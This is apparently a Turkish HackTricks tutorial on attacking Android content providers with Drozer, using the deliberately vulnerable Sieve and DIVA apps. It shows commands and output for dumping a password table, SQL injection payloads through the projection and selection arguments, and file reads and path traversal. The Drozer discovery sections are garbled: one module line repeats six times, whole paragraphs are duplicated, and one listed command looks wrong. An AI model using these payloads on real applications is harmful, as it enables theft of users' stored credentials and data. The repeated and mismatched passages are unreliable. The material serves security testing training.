# İçerik Sağlayıcılarından Yararlanma

## İçerik Sağlayıcılarından Yararlanma

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'ler**](https://opensea.io/collection/the-peass-family)imizi görün
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

## Giriş

Veri, bir bileşen olan **içerik sağlayıcı** aracılığıyla diğer uygulamalara istek üzerine **aktarılır**. Bu istekler, **ContentResolver sınıfı** yöntemleri aracılığıyla yönetilir. İçerik sağlayıcıları, verilerini **veritabanı**, **dosyalar** veya bir **ağ** üzerinde depolayabilir.

_Manifest.xml_ dosyasında, içerik sağlayıcının bildirimi gereklidir. Örneğin:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
`content://com.mwr.example.sieve.DBContentProvider/Keys` adresine erişmek için `READ_KEYS` izni gereklidir. İlginç olan şudur ki, `/Keys/` yoluna aşağıdaki bölümde erişilebilir, çünkü geliştirici `/Keys`'i güvence altına almış ancak `/Keys/` olarak belirtmiştir.

**Belki özel verilere erişebilir veya bazı zafiyetleri (SQL Injection veya Path Traversal) sömürebilirsiniz.**

## **Açığa çıkarılmış içerik sağlayıcılardan** bilgi alın
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
**DBContentProvider**'a nasıl ulaşılacağını "_content://_" ile başlayan URI'ler kullanarak birleştirmek mümkündür. Bu yaklaşım, Drozer kullanırken elde edilen bilgilerin _/Keys_ dizininde bulunmasından elde edilen bilgilerden yola çıkarak oluşturulmuştur.

Drozer, **birkaç URI tahmin edip deneyebilir**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
**ContentProvider kodunu** sorgulamak için aşağıdaki gibi kontrol edebilirsiniz:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

Ayrıca, tam sorguları bulamazsanız, ContentProvider tarafından `onCreate` yönteminde bildirilen isimleri kontrol edebilirsiniz:

![](<../../../.gitbook/assets/image (186).png>)

Sorgu şu şekilde olacaktır: `content://paketin.adı.sınıfın.adı/bildirilen_isim`

## **Veritabanı destekli Content Provider'lar**

Muhtemelen Content Provider'ların çoğu bir **veritabanı** için bir **arayüz** olarak kullanılır. Bu nedenle, erişebilirseniz bilgiyi **çıkarmak, güncellemek, eklemek ve silmek** mümkün olabilir.\
Hassas bilgilere **erişebilip erişemediğinizi kontrol edin** veya yetkilendirme mekanizmalarını **atlamak** için değiştirmeyi deneyin.

Content Provider'ın kodunu kontrol ederken, ayrıca _query, insert, update ve delete_ gibi adlara sahip **fonksiyonları** arayın:

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Çünkü onları çağırabilirsiniz.

### İçeriği sorgula
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### İçerik ekleme

Veritabanını sorgulayarak **sütunların adını** öğrenebilirsiniz, ardından DB'ye veri ekleyebilirsiniz:

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_Not: Ekleme ve güncelleme işlemlerinde --string ile string, --double ile double, --float, --integer, --long, --short, --boolean ile belirtebilirsiniz._

### İçeriği güncelleme

Sütunların adını bildiğinizde, girişleri değiştirebilirsiniz:

![](<../../../.gitbook/assets/image (190).png>)

### İçeriği silme

![](<../../../.gitbook/assets/image (191).png>)

### **SQL Injection**

**SQL enjeksiyonunu** (SQLite) test etmek oldukça basittir, içerik sağlayıcıya iletilen **projeksiyon** ve **seçim alanlarını** manipüle ederek yapılır.\
İçerik sağlayıcıyı sorgularken, bilgi aramak için 2 ilginç argüman vardır: _--selection_ ve _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

Bu **parametreleri** kötüye kullanarak **SQL enjeksiyonunu** test edebilirsiniz:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Drozer ile Otomatik SQLInjection Keşfi**

Drozer, Android uygulamalarında otomatik olarak SQLInjection zafiyetlerini keşfetmek için kullanılabilir. Bu, uygulama içindeki içerik sağlayıcıları hedef alır ve SQLInjection saldırılarına karşı potansiyel olarak savunmasız olan noktaları tespit eder.

Drozer'ın SQLInjection keşfi için kullanılan birkaç modülü vardır. Bu modüller, uygulama içindeki içerik sağlayıcılarını analiz eder ve SQLInjection saldırılarına karşı savunmasız olanları belirler. Bu modüller, otomatik olarak SQLInjection saldırıları gerçekleştirir ve sonuçları raporlar.

Drozer'ın SQLInjection keşfi için kullanılan modüllerinden bazıları şunlardır:

- `content.provider.finduri`: Bu modül, uygulama içindeki tüm içerik sağlayıcılarını bulur.
- `content.provider.finduri`: Bu modül, uygulama içindeki tüm içerik sağlayıcılarını bulur.
- `content.provider.finduri`: Bu modül, uygulama içindeki tüm içerik sağlayıcılarını bulur.

Bu modüller, uygulama içindeki içerik sağlayıcılarını analiz eder ve SQLInjection saldırılarına karşı savunmasız olanları belirler. Bu modüller, otomatik olarak SQLInjection saldırıları gerçekleştirir ve sonuçları raporlar.

Drozer'ın SQLInjection keşfi için kullanılan modüllerinden bazıları şunlardır:

- `content.provider.finduri`: Bu modül, uygulama içindeki tüm içerik sağlayıcılarını bulur.
- `content.provider.finduri`: Bu modül, uygulama içindeki tüm içerik sağlayıcılarını bulur.
- `content.provider.finduri`: Bu modül, uygulama içindeki tüm içerik sağlayıcılarını bulur.

Bu modüller, uygulama içindeki içerik sağlayıcılarını analiz eder ve SQLInjection saldırılarına karşı savunmasız olanları belirler. Bu modüller, otomatik olarak SQLInjection saldırıları gerçekleştirir ve sonuçları raporlar.
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **Dosya Sistemi Destekli İçerik Sağlayıcıları**

İçerik sağlayıcıları, **dosyalara erişmek için** de kullanılabilir:

![](<../../../.gitbook/assets/image (193).png>)

### **Dosya** okuma

İçerik sağlayıcısından dosyaları okuyabilirsiniz.
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **Yol Geçişi**

Dosyalara erişebiliyorsanız, Yol Geçişi'ni (bu durumda gerekli olmasa da "_../_" ve benzer hileleri deneyebilirsiniz) kötüye kullanmaya çalışabilirsiniz.
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Drozer ile Otomatik Yol Geçidi Keşfi**

Drozer, Android uygulamalarında otomatik olarak yol geçidi keşfi yapabilen bir araçtır. Bu yöntem, uygulamanın içerisindeki hassas verilere erişmek için kullanılabilir. Drozer, uygulamanın içerisindeki içerik sağlayıcıları hedef alarak otomatik olarak yol geçidi keşfi yapar.

Drozer'ın yol geçidi keşfi yapabilmesi için aşağıdaki adımları izleyebilirsiniz:

1. Drozer'ı çalıştırın ve hedef Android cihazına bağlanın.
2. `run app.provider.find` komutunu kullanarak yol geçidi keşfi taramasını başlatın.
3. Drozer, uygulamanın içerisindeki tüm içerik sağlayıcılarını taramaya başlayacak ve potansiyel yol geçitlerini bulacaktır.
4. Bulunan yol geçitlerini inceleyerek, uygulamanın hassas verilerine erişebilirsiniz.

Bu yöntem, uygulamanın içerisindeki hassas verilere erişmek için etkili bir yol sağlar. Ancak, bu işlemi yasal ve etik sınırlar içerisinde gerçekleştirmeniz önemlidir.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## Referanslar

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
